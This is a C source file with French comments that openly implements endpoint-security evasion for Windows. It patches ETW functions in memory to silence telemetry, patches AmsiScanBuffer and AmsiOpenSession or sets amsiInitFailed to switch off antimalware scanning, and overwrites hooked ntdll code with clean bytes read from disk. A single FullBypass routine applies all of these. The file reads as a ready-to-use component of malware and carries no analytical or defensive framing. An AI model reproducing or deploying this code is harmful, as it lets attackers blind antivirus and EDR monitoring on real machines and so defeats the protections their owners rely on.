/*
 * edr_evasion.c - Techniques de contournement EDR/AV
 *
 * Implémente:
 * - ETW Patching (désactive Event Tracing for Windows)
 * - AMSI Bypass (désactive Antimalware Scan Interface)
 * - Unhooking ntdll (restaure les fonctions hookées)
 * - CLR ETW bypass (désactive le tracing .NET)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")

/* =========================================================================
 * ETW Patching
 * Désactive Event Tracing for Windows pour éviter la télémétrie
 * ========================================================================= */

/*
 * Patch EtwEventWrite dans ntdll
 * Cette fonction est appelée pour tous les événements ETW
 * On la fait retourner immédiatement (ret 0)
 */
BOOL Evasion_PatchETW(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    /* Trouve EtwEventWrite */
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;
    
    /* Patch: xor eax, eax; ret (retourne STATUS_SUCCESS) */
    /* 33 C0 = xor eax, eax */
    /* C3    = ret */
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    
    /* Change les permissions en RWX */
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    /* Applique le patch */
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    /* Restaure les permissions */
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

/*
 * Patch NtTraceEvent - niveau plus bas qu'EtwEventWrite
 */
BOOL Evasion_PatchNtTraceEvent(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
    if (!pNtTraceEvent) return FALSE;
    
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(pNtTraceEvent, patch, sizeof(patch));
    VirtualProtect(pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

/*
 * Désactive complètement ETW en patchant plusieurs fonctions
 */
BOOL Evasion_DisableETW(void) {
    BOOL result = TRUE;
    
    /* Patch les fonctions ETW principales */
    result &= Evasion_PatchETW();
    result &= Evasion_PatchNtTraceEvent();
    
    /* Patch EtwEventWriteFull aussi */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pEtwEventWriteFull) {
        BYTE patch[] = { 0x33, 0xC0, 0xC3 };
        DWORD oldProtect;
        if (VirtualProtect(pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy(pEtwEventWriteFull, patch, sizeof(patch));
            VirtualProtect(pEtwEventWriteFull, sizeof(patch), oldProtect, &oldProtect);
        }
    }
    
    return result;
}

/* =========================================================================
 * AMSI Bypass
 * Désactive l'Antimalware Scan Interface
 * ========================================================================= */

/*
 * Patch AmsiScanBuffer dans amsi.dll
 * Méthode classique: fait retourner AMSI_RESULT_CLEAN
 */
BOOL Evasion_PatchAMSI(void) {
    /* Charge amsi.dll si pas déjà chargé */
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        /* AMSI pas disponible (Windows < 10 ou pas de PowerShell/etc) */
        return TRUE;
    }
    
    /* Trouve AmsiScanBuffer */
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        return FALSE;
    }
    
    /* Patch pour retourner E_INVALIDARG (fait échouer le scan proprement) */
    /* mov eax, 0x80070057 (E_INVALIDARG) */
    /* ret */
#ifdef _WIN64
    BYTE patch[] = { 
        0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 */
        0xC3                            /* ret */
    };
#else
    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 */
        0xC2, 0x18, 0x00               /* ret 0x18 (stdcall) */
    };
#endif
    
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

/*
 * Patch AmsiOpenSession - alternative
 */
BOOL Evasion_PatchAmsiOpenSession(void) {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return TRUE;
    }
    
    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (!pAmsiOpenSession) return FALSE;
    
    /* Retourne E_INVALIDARG */
#ifdef _WIN64
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x0C, 0x00 };
#endif
    
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(pAmsiOpenSession, patch, sizeof(patch));
    VirtualProtect(pAmsiOpenSession, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

/*
 * Bypass AMSI via modification de la variable globale amsiInitFailed
 * Plus discret que le patching direct
 */
BOOL Evasion_AmsiInitFailedBypass(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE;
    
    /* Cherche le pattern pour trouver amsiInitFailed */
    /* Cette variable est checkée au début d'AmsiScanBuffer */
    
    /* Alternative: cherche "AmsiInitialize" et analyse le code */
    FARPROC pAmsiInitialize = GetProcAddress(hAmsi, "AmsiInitialize");
    if (!pAmsiInitialize) return FALSE;
    
    /* Scan pour trouver la référence à amsiInitFailed
     * Pattern typique après AmsiInitialize: cmp byte ptr [amsiInitFailed], 0 */
    
    BYTE* ptr = (BYTE*)pAmsiInitialize;
    
    /* Cherche dans les 256 premiers bytes */
    for (int i = 0; i < 256; i++) {
        /* Pattern: 80 3D XX XX XX XX 00 (cmp byte ptr [rip+XX], 0) en x64 */
        if (ptr[i] == 0x80 && ptr[i+1] == 0x3D && ptr[i+6] == 0x00) {
            /* Calcule l'adresse de la variable */
            int32_t offset = *(int32_t*)(ptr + i + 2);
            BYTE* pAmsiInitFailed = ptr + i + 7 + offset;
            
            /* Change les permissions */
            DWORD oldProtect;
            if (VirtualProtect(pAmsiInitFailed, 1, PAGE_READWRITE, &oldProtect)) {
                /* Met amsiInitFailed à 1 */
                *pAmsiInitFailed = 1;
                VirtualProtect(pAmsiInitFailed, 1, oldProtect, &oldProtect);
                return TRUE;
            }
        }
    }
    
    /* Fallback sur le patch classique */
    return Evasion_PatchAMSI();
}

/*
 * Désactive AMSI complètement
 */
BOOL Evasion_DisableAMSI(void) {
    BOOL result = TRUE;
    
    result &= Evasion_PatchAMSI();
    result &= Evasion_PatchAmsiOpenSession();
    
    return result;
}

/* =========================================================================
 * Unhooking NTDLL
 * Restaure ntdll depuis le disque pour supprimer les hooks EDR
 * ========================================================================= */

/*
 * Lit ntdll.dll depuis le disque
 */
static BYTE* ReadNtdllFromDisk(DWORD* outSize) {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }
    
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }
    
    CloseHandle(hFile);
    
    if (outSize) *outSize = fileSize;
    return buffer;
}

/*
 * Unhook ntdll en remappant la section .text depuis le disque
 */
BOOL Evasion_UnhookNtdll(void) {
    /* Récupère l'adresse de ntdll en mémoire */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    /* Lit ntdll depuis le disque */
    DWORD fileSize;
    BYTE* fileBuffer = ReadNtdllFromDisk(&fileSize);
    if (!fileBuffer) return FALSE;
    
    /* Parse le PE du fichier */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(fileBuffer);
        return FALSE;
    }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        free(fileBuffer);
        return FALSE;
    }
    
    /* Trouve la section .text */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER textSection = NULL;
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            textSection = &section[i];
            break;
        }
    }
    
    if (!textSection) {
        free(fileBuffer);
        return FALSE;
    }
    
    /* Calcule les adresses */
    BYTE* srcText = fileBuffer + textSection->PointerToRawData;
    BYTE* dstText = (BYTE*)hNtdll + textSection->VirtualAddress;
    DWORD textSize = textSection->SizeOfRawData;
    
    /* Change les permissions de la section .text en mémoire */
    DWORD oldProtect;
    if (!VirtualProtect(dstText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        free(fileBuffer);
        return FALSE;
    }
    
    /* Copie la section .text originale (non hookée) */
    memcpy(dstText, srcText, textSize);
    
    /* Restaure les permissions */
    VirtualProtect(dstText, textSize, oldProtect, &oldProtect);
    
    free(fileBuffer);
    return TRUE;
}

/*
 * Unhook une fonction spécifique de ntdll
 */
BOOL Evasion_UnhookFunction(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return FALSE;
    
    /* Lit ntdll depuis le disque */
    DWORD fileSize;
    BYTE* fileBuffer = ReadNtdllFromDisk(&fileSize);
    if (!fileBuffer) return FALSE;
    
    /* Parse le PE */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
    
    /* Calcule l'offset de la fonction dans le fichier */
    DWORD funcRva = (DWORD)((BYTE*)pFunc - (BYTE*)hNtdll);
    
    /* Trouve la section contenant cette RVA */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (funcRva >= section[i].VirtualAddress &&
            funcRva < section[i].VirtualAddress + section[i].Misc.VirtualSize) {
            
            /* Calcule l'offset dans le fichier */
            DWORD fileOffset = section[i].PointerToRawData + 
                              (funcRva - section[i].VirtualAddress);
            
            BYTE* originalBytes = fileBuffer + fileOffset;
            
            /* Copie les premiers bytes (stub de la fonction) */
            /* Les hooks sont généralement dans les 16 premiers bytes */
            DWORD bytesToCopy = 32;
            
            DWORD oldProtect;
            if (VirtualProtect(pFunc, bytesToCopy, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pFunc, originalBytes, bytesToCopy);
                VirtualProtect(pFunc, bytesToCopy, oldProtect, &oldProtect);
                
                free(fileBuffer);
                return TRUE;
            }
            
            break;
        }
    }
    
    free(fileBuffer);
    return FALSE;
}

/*
 * Unhook les fonctions sensibles couramment hookées par les EDR
 */
BOOL Evasion_UnhookSensitiveFunctions(void) {
    const char* sensitiveFunctions[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtCreateThread",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtOpenThread",
        "NtQueueApcThread",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtCreateSection",
        "NtResumeThread",
        "NtSuspendThread",
        "NtSetContextThread",
        "NtGetContextThread",
        NULL
    };
    
    BOOL allSuccess = TRUE;
    
    for (int i = 0; sensitiveFunctions[i]; i++) {
        if (!Evasion_UnhookFunction(sensitiveFunctions[i])) {
            allSuccess = FALSE;
        }
    }
    
    return allSuccess;
}

/* =========================================================================
 * Détection de hooks
 * Vérifie si des fonctions sont hookées
 * ========================================================================= */

/*
 * Vérifie si une fonction est hookée
 * Retourne TRUE si hookée
 */
BOOL Evasion_IsFunctionHooked(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return FALSE;
    
    BYTE* ptr = (BYTE*)pFunc;
    
    /* Patterns de hooks courants */
    
    /* JMP rel32 (E9 XX XX XX XX) */
    if (ptr[0] == 0xE9) {
        return TRUE;
    }
    
    /* JMP [rip+0] suivi de l'adresse (FF 25 00 00 00 00) */
    if (ptr[0] == 0xFF && ptr[1] == 0x25) {
        return TRUE;
    }
    
    /* MOV R10, addr + JMP R10 */
    if (ptr[0] == 0x49 && ptr[1] == 0xBA) {
        return TRUE;
    }
    
    /* Pattern normal: mov r10, rcx (4C 8B D1) */
    /* Si ce n'est pas là, probablement hooké */
    if (ptr[0] != 0x4C || ptr[1] != 0x8B || ptr[2] != 0xD1) {
        return TRUE;
    }
    
    return FALSE;
}

/*
 * Liste les fonctions hookées
 */
BOOL Evasion_ListHookedFunctions(char** outJson) {
    if (!outJson) return FALSE;
    
    const char* functionsToCheck[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtCreateThread",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtOpenThread",
        "NtQueueApcThread",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtCreateSection",
        "NtResumeThread",
        "NtSuspendThread",
        "NtSetContextThread",
        "NtGetContextThread",
        "NtCreateFile",
        "NtReadFile",
        "NtWriteFile",
        "NtDeviceIoControlFile",
        NULL
    };
    
    char* json = (char*)malloc(8192);
    if (!json) return FALSE;
    
    int offset = snprintf(json, 8192,
        "{\n  \"hooked_functions\": [\n");
    
    int hookedCount = 0;
    BOOL first = TRUE;
    
    for (int i = 0; functionsToCheck[i]; i++) {
        if (Evasion_IsFunctionHooked(functionsToCheck[i])) {
            if (!first) {
                offset += snprintf(json + offset, 8192 - offset, ",\n");
            }
            first = FALSE;
            
            offset += snprintf(json + offset, 8192 - offset,
                "    \"%s\"", functionsToCheck[i]);
            hookedCount++;
        }
    }
    
    snprintf(json + offset, 8192 - offset,
        "\n  ],\n"
        "  \"hooked_count\": %d,\n"
        "  \"total_checked\": %d\n"
        "}",
        hookedCount, (int)(sizeof(functionsToCheck)/sizeof(functionsToCheck[0]) - 1));
    
    *outJson = json;
    return TRUE;
}

/* =========================================================================
 * CLR ETW Bypass
 * Désactive le tracing .NET/CLR
 * ========================================================================= */

/*
 * Patch les providers ETW du CLR
 */
BOOL Evasion_DisableCLRETW(void) {
    /* Les DLLs CLR contiennent des appels ETW */
    /* On peut patcher clr.dll/coreclr.dll */
    
    HMODULE hClr = GetModuleHandleA("clr.dll");
    if (!hClr) {
        hClr = GetModuleHandleA("coreclr.dll");
    }
    
    if (!hClr) {
        /* CLR pas chargé, rien à faire */
        return TRUE;
    }
    
    /* Le CLR utilise des fonctions internes pour ETW */
    /* On peut essayer de patcher EtwEventWrite dans ce contexte aussi */
    
    return Evasion_PatchETW();
}

/* =========================================================================
 * API Principale
 * ========================================================================= */

/*
 * Applique toutes les techniques d'évasion EDR
 */
BOOL Evasion_FullBypass(void) {
    BOOL result = TRUE;
    
    /* 1. Désactive ETW */
    result &= Evasion_DisableETW();
    
    /* 2. Désactive AMSI */
    result &= Evasion_DisableAMSI();
    
    /* 3. Unhook les fonctions sensibles */
    result &= Evasion_UnhookSensitiveFunctions();
    
    return result;
}

/*
 * Retourne l'état des protections
 */
BOOL Evasion_GetStatus(char** outJson) {
    if (!outJson) return FALSE;
    
    char* json = (char*)malloc(1024);
    if (!json) return FALSE;
    
    /* Vérifie si AMSI est chargé */
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    
    /* Vérifie si des fonctions sont hookées */
    BOOL hasHooks = Evasion_IsFunctionHooked("NtAllocateVirtualMemory") ||
                    Evasion_IsFunctionHooked("NtProtectVirtualMemory") ||
                    Evasion_IsFunctionHooked("NtWriteVirtualMemory");
    
    snprintf(json, 1024,
        "{\n"
        "  \"amsi_loaded\": %s,\n"
        "  \"hooks_detected\": %s,\n"
        "  \"clr_loaded\": %s\n"
        "}",
        hAmsi ? "true" : "false",
        hasHooks ? "true" : "false",
        GetModuleHandleA("clr.dll") ? "true" : "false");
    
    *outJson = json;
    return TRUE;
}
